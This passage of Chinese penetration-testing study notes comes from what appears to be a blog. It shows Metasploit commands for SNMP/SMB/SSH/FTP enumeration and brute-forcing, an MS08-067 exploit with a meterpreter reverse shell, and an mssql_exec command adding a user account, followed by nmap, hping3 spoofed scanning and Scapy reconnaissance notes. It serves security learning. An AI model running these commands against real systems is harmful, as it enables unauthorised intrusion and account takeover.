<li>use auxiliary/scanner/snmp/snmp_login</li>
<li>use auxiliary/scanner/snmp/snmp_enum</li>
<li>use auxiliary/scanner/snmp/snmp_enumusers （windows）</li>
<li>use auxiliary/scanner/snmp/snmp_enumshares （windows）</li>
</ul>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_login</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_login) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/snmp/snmp_login) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.149</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/snmp/<span class="comment">snmp_login) &gt; set THREADS 20</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/snmp/<span class="comment">snmp_login) &gt; run</span></span><br></pre></td></tr></table></figure>

<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_enum</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.149</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/snmp/<span class="comment">snmp_enum) &gt; run</span></span><br></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_enum</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; show options </span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; <span class="builtin-name">set</span> RHOSTS 10.10.10.142 （windows）</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; run</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; <span class="builtin-name">set</span><span class="built_in"> COMMUNITY </span>jlcssadmin （SNMP 服务器团体名）</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; <span class="builtin-name">set</span> THREADS 20</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; run</span><br></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_enumusers</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumusers) &gt; show options </span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumusers) &gt; <span class="builtin-name">set</span><span class="built_in"> COMMUNITY </span>jlcssadmin</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumusers) &gt; <span class="builtin-name">set</span> RHOSTS 10.10.10.142</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumusers) &gt; run</span><br></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_enumshares</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumshares) &gt; show options </span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumshares) &gt; <span class="builtin-name">set</span><span class="built_in"> COMMUNITY </span>jlcssadmin</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumshares) &gt; <span class="builtin-name">set</span> RHOSTS 10.10.10.142</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumshares) &gt; run</span><br></pre></td></tr></table></figure>

<h4 id="8-SMB扫描"><a href="#8-SMB扫描" class="headerlink" title="8.SMB扫描"></a>8.SMB扫描</h4><ul>
<li>SMB 版本扫描<ul>
<li>use auxiliary/scanner/smb/smb_version</li>
</ul>
</li>
<li>扫描命令管道。判断 SMB 服务类型（账号、密码）<ul>
<li>use auxiliary/scanner/smb/pipe_auditor</li>
</ul>
</li>
<li>扫描通过 SMB 管道可以访问的 RCERPC 服务<ul>
<li>use auxiliary/scanner/smb/pipe_dcerpc_auditor</li>
</ul>
</li>
<li>SMB 共享账号（账号、密码）<ul>
<li>use auxiliary/scanner/smb/smb_enumshares</li>
</ul>
</li>
<li>SMB 用户枚举（账号、密码）<ul>
<li>use auxiliary/scanner/smb/smb_enumusers</li>
</ul>
</li>
<li>SID 枚举（账号、密码）<ul>
<li>use auxiliary/scanner/smb/smb_lookupsid</li>
</ul>
</li>
<li>SMB 版本扫描</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msf &gt; search smb</span><br><span class="line">msf &gt; use auxiliary/scanner/smb/smb_version</span><br><span class="line">msf auxiliary(scanner/smb/smb_version) &gt; show options </span><br><span class="line">msf auxiliary(scanner/smb/smb_version) &gt; <span class="builtin-name">set</span> RHOSTS 10.10.10.147, 10.10.10.148, 10.10.10.142</span><br><span class="line">msf auxiliary(scanner/smb/smb_version) &gt; run</span><br></pre></td></tr></table></figure>

<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"># 继续上述</span><br><span class="line">msf auxiliary(scanner/smb/smb_version) &gt; <span class="keyword">set</span> SMBUSER <span class="comment">Administrator</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_version) &gt; set SMBPass 123456</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_version) &gt; run</span></span><br></pre></td></tr></table></figure>

<ul>
<li>扫描命令管道。判断 SMB 服务类型（账号、密码）</li>
</ul>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/pipe_auditor</span><br><span class="line">msf auxiliary(scanner/smb/pipe_auditor) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/smb/pipe_auditor) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.148</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">pipe_auditor) &gt; run</span></span><br></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 继续上述</span></span><br><span class="line">msf auxiliary(scanner/smb/pipe_auditor) &gt; <span class="builtin-name">set</span> SMBUser Administrator</span><br><span class="line">msf auxiliary(scanner/smb/pipe_auditor) &gt; <span class="builtin-name">set</span> SMBPass 123456</span><br></pre></td></tr></table></figure>

<ul>
<li>扫描通过 SMB 管道可以访问的 RCERPC 服务</li>
</ul>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/pipe_dcerpc_auditor</span><br><span class="line">msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.148</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">pipe_dcerpc_auditor) &gt; run</span></span><br></pre></td></tr></table></figure>

<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"># 继续上述</span><br><span class="line">msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; <span class="keyword">set</span> SMBUser <span class="comment">Administrator</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">pipe_dcerpc_auditor) &gt; set SMBPass 123456</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">pipe_dcerpc_auditor) &gt; run</span></span><br></pre></td></tr></table></figure>

<ul>
<li>SMB 共享账号（账号、密码）</li>
</ul>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_enumshares</span><br><span class="line">msf auxiliary(scanner/smb/smb_enumshares) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/smb/smb_enumshares) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.148</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_enumshares) &gt; run</span></span><br></pre></td></tr></table></figure>

<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"># 继续上述</span><br><span class="line">msf auxiliary(scanner/smb/smb_enumshares) &gt; <span class="keyword">set</span> SMBUser <span class="comment">Administrator</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_enumshares) &gt; set SMBPass 123456</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_enumshares) &gt; run</span></span><br></pre></td></tr></table></figure>

<ul>
<li>SMB 用户枚举（账号、密码）</li>
</ul>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_enumusers</span><br><span class="line">msf auxiliary(scanner/smb/smb_enumusers) &gt; show <span class="keyword">options</span> </span><br><span class="line">msf auxiliary(scanner/smb/smb_enumusers) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.148</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_enumusers) &gt; run</span></span><br></pre></td></tr></table></figure>

<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"># 继续上述</span><br><span class="line">msf auxiliary(scanner/smb/smb_enumusers) &gt; <span class="keyword">set</span> SMBUser <span class="comment">Administrator</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_enumusers) &gt; set SMBPass 123456</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_enumusers) &gt; run</span></span><br></pre></td></tr></table></figure>

<ul>
<li>SID 枚举（账号、密码）</li>
</ul>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_lookupsid</span><br><span class="line">msf auxiliary(scanner/smb/smb_lookupsid) &gt; show options </span><br><span class="line">msf auxiliary(scanner/smb/smb_lookupsid) &gt; <span class="keyword">set</span> RHOSTS <span class="number">10.10</span><span class="number">.10</span><span class="number">.148</span></span><br></pre></td></tr></table></figure>

<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"># 继续上述</span><br><span class="line">msf auxiliary(scanner/smb/smb_lookupsid) &gt; <span class="keyword">set</span> SMBUser <span class="comment">Administrator</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_lookupsid) &gt; set SMBPass 123456</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/smb/<span class="comment">smb_lookupsid) &gt; run</span></span><br></pre></td></tr></table></figure>

<h4 id="SSH扫描"><a href="#SSH扫描" class="headerlink" title="SSH扫描"></a>SSH扫描</h4><ul>
<li>SSH 版本扫描<ul>
<li>use auxiliary/scanner/ssh/ssh_version</li>
</ul>
</li>
<li>SSH 密码爆破<ul>
<li>use auxiliary/scanner/ssh/ssh_login<ul>
<li>set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt ；set VERBOSE false ；run</li>
</ul>
</li>
</ul>
</li>
<li>SSH 公钥登陆<ul>
<li>use auxiliary/scanner/ssh/ssh_login_pubkey<ul>
<li>set KEY_FILE id_rsa；set USERNAME root ；run</li>
</ul>
</li>
</ul>
</li>
<li>SSH 版本扫描</li>
</ul>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_version) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.132</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ssh/<span class="comment">ssh_version) &gt; run</span></span><br></pre></td></tr></table></figure>

<ul>
<li>SSH 密码爆破</li>
</ul>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">root@kali:~# more /usr/share/metasploit-framework/data/wordlists/root_userpass.txt </span><br><span class="line"></span><br><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.132</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ssh/<span class="comment">ssh_login) &gt; set USERPASS_FILE</span> /usr/<span class="comment">share</span>/metasploit-framework/<span class="comment">data</span>/wordlists/<span class="comment">root_userpass.txt</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ssh/<span class="comment">ssh_login) &gt; set VERBOSE false</span> </span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ssh/<span class="comment">ssh_login) &gt; run</span></span><br></pre></td></tr></table></figure>

<ul>
<li>SSH 公钥登陆</li>
</ul>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_login_pubkey</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.132</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ssh/<span class="comment">ssh_login_pubkey) &gt; set USERNAME root</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ssh/<span class="comment">ssh_login_pubkey) &gt; set KEY_PATH id_rsa_test_file</span></span><br></pre></td></tr></table></figure>

<h4 id="windows缺少的补丁"><a href="#windows缺少的补丁" class="headerlink" title="windows缺少的补丁"></a>windows缺少的补丁</h4><ul>
<li><p>基于已经取得的 session 进行检测</p>
</li>
<li><p>use post/windows/gather/enum_patches</p>
<ul>
<li>show advanced</li>
<li>set VERBOSE yes</li>
</ul>
</li>
<li><p>检查失败</p>
<ul>
<li>known bug in WMI query, try migrating to another process</li>
<li>迁移到另一个进程再次进行尝试</li>
</ul>
</li>
<li><p>ms08-067</p>
</li>
</ul>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">msf exploit(windows/smb/ms08_067_netapi) &gt; <span class="keyword">set</span> RHOST <span class="comment">10.10.10.147</span></span><br><span class="line">msf <span class="comment">exploit(windows</span>/smb/<span class="comment">ms08_067_netapi) &gt; set payload windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line">msf <span class="comment">exploit(windows</span>/smb/<span class="comment">ms08_067_netapi) &gt; run</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/oXOv9u8.png" alt="img"></p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; backgroun</span><br><span class="line">msf exploit(<span class="name">windows/smb/ms08_067_netapi</span>) &gt; sessions</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/5eADIeS.png" alt="img"></p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">msf exploit(<span class="name">windows/smb/ms08_067_netapi</span>) &gt; use post/windows/gather/enum_patches</span><br><span class="line">msf post(<span class="name">windows/gather/enum_patches</span>) &gt; set SESSION <span class="number">4</span></span><br><span class="line">msf post(<span class="name">windows/gather/enum_patches</span>) &gt; run</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/VEpQ5Ut.png" alt="img"></p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进程错误，迁移进程</span></span><br><span class="line"><span class="attr">msf</span> <span class="string">post(windows/gather/enum_patches) &gt; sessions -i 4</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; getpid</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; ps</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; migrate 828  # spoolsv.exe</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; background </span></span><br><span class="line"><span class="attr">msf</span> <span class="string">post(windows/gather/enum_patches) &gt; run</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/DCfpDji.png" alt="img"></p>
<h4 id="mssql-扫描"><a href="#mssql-扫描" class="headerlink" title="mssql 扫描"></a>mssql 扫描</h4><ul>
<li><p>mssql 扫描端口</p>
<ul>
<li>TCP 1422（动态端口）/ UDP 1434 （查询 TCP 端口号）</li>
<li>use auxiliary/scanner/mssql/mssql_ping</li>
</ul>
</li>
<li><p>爆破 mssql 密码</p>
</li>
<li><p>use auxiliary/scanner/mssql/mssql_login</p>
</li>
<li><p>远程执行代码（获取数据库权限之后）</p>
</li>
<li><p>use auxiliary/admin/mssql/mssql_exec</p>
<ul>
<li>set CMD net user user1 pass123 /ADD</li>
</ul>
</li>
<li><p>mssql扫描端口</p>
</li>
</ul>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/mssql/mssql_ping</span><br><span class="line">msf auxiliary(scanner/mssql/mssql_ping) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.142</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/mssql/<span class="comment">mssql_ping) &gt; run</span></span><br></pre></td></tr></table></figure>

<h4 id="FTP扫描"><a href="#FTP扫描" class="headerlink" title="FTP扫描"></a>FTP扫描</h4><ul>
<li><p>ftp 版本扫描</p>
<ul>
<li>use auxiliary/scanner/ftp/ftp_version</li>
<li>use auxiliary/scanner/ftp/anonymous</li>
<li>use auxiliary/scanner/ftp/ftp_login</li>
</ul>
</li>
<li><p>use auxiliary/scanner/ [tab]</p>
</li>
<li><p>Display all 479 possibilities? (y or n)</p>
</li>
<li><p>查询版本信息</p>
</li>
</ul>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ftp/ftp_version</span><br><span class="line">msf (scanner/ftp/ftp_version) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.132</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ftp/<span class="comment">ftp_version) &gt; run</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/HZ8JVfi.png" alt="img"></p>
<ul>
<li><p>是否允许匿名登录</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ftp/anonymous</span><br><span class="line">msf auxiliary(scanner/ftp/anonymous) &gt; <span class="keyword">set</span> RHOSTS <span class="comment">10.10.10.132</span></span><br><span class="line">msf <span class="comment">auxiliary(scanner</span>/ftp/<span class="comment">anonymous) &gt; run</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p><img src="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/A6Ms8B3.png" alt="img"></p>
<ul>
<li><p>暴力破解</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> auxiliary/scanner/<span class="keyword">ftp</span>/ftp_login</span><br></pre></td></tr></table></figure>













</li>
</ul>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试——主动信息收集</title>
    <url>/2020/03/12/shen-tou-ce-shi-zhu-dong-xin-xi-shou-ji/</url>
    <content><![CDATA[<h3 id="主动信息收集部分"><a href="#主动信息收集部分" class="headerlink" title="主动信息收集部分"></a>主动信息收集部分</h3><h4 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h4><ul>
<li><p>直接与目标主机交互</p>
</li>
<li><p>无法避免留下发文的痕迹；</p>
</li>
<li><p>使用受控的第三方电脑进行探测；</p>
</li>
<li><p>使用代理或者已经被控制的主机</p>
</li>
<li><p>做好被封杀的准备</p>
</li>
<li><p>使用噪音迷惑目标，淹没真实的探测流量</p>
</li>
<li><p>扫描-发送不同的探测，根据返回结果判断目标状态</p>
</li>
</ul>
<h4 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h4><ul>
<li>识别活着的主机</li>
<li>潜在的被攻击目标</li>
<li>输出一个IP地址列表</li>
<li>网络2、3、4层发现</li>
</ul>
<p>包括ARP、IPv4、IPv6、ICMP、IPSec、TCP、UDP</p>
<h4 id="发现——二层发现"><a href="#发现——二层发现" class="headerlink" title="发现——二层发现"></a>发现——二层发现</h4><p>优点：扫描速度快，可靠</p>
<p>缺点：不可路由</p>
<h5 id="Arp协议"><a href="#Arp协议" class="headerlink" title="Arp协议"></a>Arp协议</h5><ul>
<li><p>抓包</p>
</li>
<li><p>arping 1.1.1.1 -c 1</p>
</li>
<li><p>arping 1.1.1.1 -d</p>
<p>发现重复响应，不同mac地址拥有相同的IP时，退出返回1</p>
<p> arp地址欺骗：在你的网络里有另外一个IP地址，声称自己是网关IP，发给网关的数据包就会发给欺骗的主机，该主机的所有者就可以在其机器上抓包，实现中间人攻击，嗅探甚至修改通过该主机传输的数据包，窃取密码，篡改数据，实现一些恶意攻击。</p>
</li>
<li><p>arping -c 1.1.1.1 grep “bytes from”|cut -d “ “ -f 5|cut -d “(“ -f 2 |cut -d “)” -f 1</p>
</li>
<li><p>脚本：</p>
<p>arping1.sh eth0&gt;addrs</p>
</li>
</ul>
<p>​       arping2.sh addrs    </p>
<h5 id="nmap二层发现"><a href="#nmap二层发现" class="headerlink" title="nmap二层发现"></a>nmap二层发现</h5><ul>
<li>nmap 1.1.1.1-254 -sn</li>
<li>nmap 1.1.1.1/24 -sn</li>
</ul>
<p>​          -sn ping扫描，禁用端口扫描</p>
<ul>
<li>​    nmap -iL iplist.txt -sn （扫描文件内IP，类似arping2.sh功能）</li>
</ul>
<h5 id="Netdiscover–二层发现"><a href="#Netdiscover–二层发现" class="headerlink" title="Netdiscover–二层发现"></a>Netdiscover–二层发现</h5><ol>
<li>专用于二层发现</li>
<li>可用于无线和交换网络环境</li>
<li>主动和被动探测</li>
</ol>
<p><strong>主动</strong></p>
<p>netdiscover -i eth0 -r 192.168.1/24</p>
<p>netdiscover -i iplist.txt</p>
<p><strong>被动</strong></p>
<p>netdiscover -p  #将本地网卡赋值为混杂模式，非本网卡的数据包也会被侦听到</p>
<p>主动arp容易触发报警</p>
<h5 id="Scapy-二层发现"><a href="#Scapy-二层发现" class="headerlink" title="Scapy-二层发现"></a>Scapy-二层发现</h5><p>•作为Python库进行调用</p>
<p>•也可作为单独的工具使用</p>
<p>•抓包、分析、创建、修改、注入网络流量</p>
<p>• apt-get install python-gnuplot #安装python-gnuplot组件</p>
<p>• Scapy  #启动Scapy</p>
<h4 id="发现-三层发现"><a href="#发现-三层发现" class="headerlink" title="发现-三层发现"></a>发现-三层发现</h4><p>IP,icmp协议  网络控制管理层</p>
<p>路径发现，主机网络通断的诊断</p>
<p>优点：可路由，速度快。</p>
<p>缺点：速度比二层慢，经常被边界防火墙过滤。</p>
<h5 id="ping-icmp"><a href="#ping-icmp" class="headerlink" title="ping(icmp)"></a>ping(icmp)</h5><ul>
<li>ping 192.168.1.1 -c 2（设置发包的数量）</li>
<li>路由追踪：traceroute <a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a></li>
<li>ping -R 192.168.1.1</li>
<li>ping 192.168.1.1 -c 1 | grep “bytes from”|cut -d “” -f 4 | cut -d “.” -f 1</li>
</ul>
<h5 id="Scapy"><a href="#Scapy" class="headerlink" title="Scapy"></a>Scapy</h5><p>OSI多层堆叠手工声称ICMP包-IP/icmp</p>
<ul>
<li>i=Ip()</li>
<li>i.dst=”192.168.1.1”（目标IP地址）</li>
<li>p=ICMP()</li>
<li>a=str(i/p)</li>
<li>a.display()</li>
</ul>
<h5 id="Nmap——三层发现"><a href="#Nmap——三层发现" class="headerlink" title="Nmap——三层发现"></a>Nmap——三层发现</h5><p>nmap -sn 192.168.1/24  (-sn在同一网段，用arp，不同网段，用ICMP)</p>
<h5 id="fping-——三层发现"><a href="#fping-——三层发现" class="headerlink" title="fping ——三层发现"></a>fping ——三层发现</h5><ul>
<li>fping 1.1.1.1 -c 1 （会显示包大小、响应时间、丢包率）</li>
<li>fping -g 1.1.1.1  1.1.1.2(起始参数 结束参数)</li>
<li>fping -g 1.1.1.0/24</li>
<li>fping -f iplist.txt</li>
</ul>
<h5 id="hping——三层发现"><a href="#hping——三层发现" class="headerlink" title="hping——三层发现"></a>hping——三层发现</h5><ul>
<li>Hping(功能强大)</li>
<li>能够发送几乎任意TCP/IP包</li>
<li>功能强大但每次只能扫描一个目标</li>
<li>hping3 192.168.1.1 –icmp -c 5(发5个ping包)</li>
<li>for addr in $(seq 1 254); do hping3 192.168.1.$addr –icmp -c 5 &gt;&gt; handle.txt &amp; done</li>
</ul>
<h4 id="发现——四层扫描"><a href="#发现——四层扫描" class="headerlink" title="发现——四层扫描"></a>发现——四层扫描</h4><p>优点</p>
<ul>
<li>可路由且结果可靠</li>
<li>不太可能被防火墙过滤</li>
<li>甚至可以发现所有端口都被过滤的主机</li>
</ul>
<p>缺点</p>
<ul>
<li>基于状态过滤的防火墙可能过滤扫描</li>
<li>全端口扫描速度慢</li>
</ul>
<p>TCP(三次握手)</p>
<p>未经请求的ACK-RST（非正常通信：目标在线）</p>
<p>SYN-SYN/ACK、RST(正常通信：目标在线)</p>
<p>UDP</p>
<p>目标IP不在线，无响应，目标IP在线、探测的端口也是开放状态，目标主机不会回复；只有一种情况可以探测：我发向目标IP一个没有开放的端口，对方回复一个ICNP端口不可达、一去不复返。</p>
<p>ACK—Tcp  Port—-RST(如果返回rst则在线)</p>
<p>scapy：</p>
<p>\1. i=IP()</p>
<p>\2. t=TCP()</p>
<p>3.r=(i/t)</p>
<p>4.r[tcp].flags=’A’（表示发ack包）</p>
<p>r[IP].dst=”1.1.1.1”</p>
<p>a=sr1(r)</p>
<p>a.display()(查看返回的包)</p>
<p>a=sr1(IP(dst=”1.1.1.1”)/TCP(dport=80,flags=’A’),timeout=1)</p>
<p>UDP—–UDP Port—–icmp</p>
<p>1.u=UDP()</p>
<p>2.u.deport=33333</p>
<p>3.r=(i/u)</p>
<p>4.a=sr1(r.timeout=1,verbose=1)</p>
<p>5.a.display()</p>
<p>6.a=sr1(r)</p>
<p>port-unreachable(目标端口不可达)</p>
<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><h5 id="scapy"><a href="#scapy" class="headerlink" title="scapy"></a>scapy</h5><p>str1(dst=”192.168.1.1”/TCP(dport=80),timeout=1,verbose=1)</p>
<p>操作系统莫名接受一个syn/ack包，会自动给目标服务器回复一个rst包</p>
<h5 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h5><p>nmap -sS 1.1.1.1 -p 80,21,25,443</p>
<p>可以不加-sS 默认是-sS</p>
<p>-p 1-100 扫描1到100</p>
<p>-p 全扫描</p>
<p>–open 只显示open的端口</p>
<p>nmap -sS -iL test.txt -p 80</p>
<h5 id="hping3"><a href="#hping3" class="headerlink" title="hping3:"></a>hping3:</h5><p>hping3 1.1.1.1 –scan 80,21,25 -S</p>
<p>hping3 1.1.1.1 –scan 0-65535 -S</p>
<p>hping3 -c 10 -S –spoof 192.168.1.140 -p ++1 192.168.1.1</p>
<p>-c 发包数量 –spoof欺骗伪造成另一个IP</p>
<p>++1端口号每次+1</p>
<h5 id="全连接端口扫描"><a href="#全连接端口扫描" class="headerlink" title="全连接端口扫描"></a>全连接端口扫描</h5><p>全连接对scapy比较困难</p>
<p>特殊情况下隐蔽扫描无法准确检测</p>
<p>把操作系统返回的rst包被iptable过滤掉,建立完整的连接</p>
<p>iptables -A OUTPUT -p tcp –tcp-flags RST RST -d 192.168.1.134 -j DROP</p>
<p>-d 目标ip</p>
<p>scapy脚本</p>
<p><strong>nmap:</strong></p>
<p>nmap -sT 1.1.1.1 -p 80,21</p>
<p>nmap -sT 1.1.1.1 -p 80-2000</p>
<p>nmap -sT -iL test.txt -p 80</p>
<p>不加-p 默认1000个常用端口</p>
<p><strong>dmitry:</strong></p>
<p>功能简单,但使用简便,默认150个做常用端口</p>
<p>dmitry -p 1.1.1.1  //tcp扫描</p>
<p>dmitry -p 1.1.1.1 -o output</p>
<p>-o 保存到文件</p>
<p><strong>nc:</strong></p>
<p>nc -nv -w l -z 1.1.1.1 1-100</p>
<p>-w 超时时间</p>
<h4 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h4><ul>
<li><p>识别开发端口上运行的应用</p>
</li>
<li><p>识别目标操作系统</p>
</li>
<li><p>提高攻击效率</p>
<ul>
<li>Banner捕获</li>
<li>服务识别</li>
<li>操作系统识别</li>
<li>SNMP分析</li>
<li>防火墙识别</li>
</ul>
<h5 id="服务扫描——banner"><a href="#服务扫描——banner" class="headerlink" title="服务扫描——banner"></a>服务扫描——banner</h5><ul>
<li>软件开发商</li>
<li>软件名称</li>
<li>服务类型</li>
<li>版本号</li>
<li>直接发现已知的漏洞和弱点</li>
</ul>
</li>
<li><p>连接建立后直接获取banner</p>
</li>
<li><p>另类服务识别方法</p>
<ul>
<li>特征行为和响应字段</li>
<li>不同的响应可用于识别底层操作系统</li>
</ul>
<p><strong>Python socket</strong></p>
<ul>
<li><p>Socket模块用于连接网络服务</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">bangrab=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">bangrab.connect((<span class="string">"1.1.1.1"</span>,<span class="number">21</span>))</span><br><span class="line">bangrab.recv(<span class="number">4096</span>)</span><br><span class="line">bangrab.close()</span><br><span class="line"><span class="keyword">exit</span>()</span><br></pre></td></tr></table></figure>
</li>
<li><p>Banner不允许抓取，recv函数无返回将挂起！</p>
</li>
</ul>
<p><strong>dmitry</strong></p>
<ul>
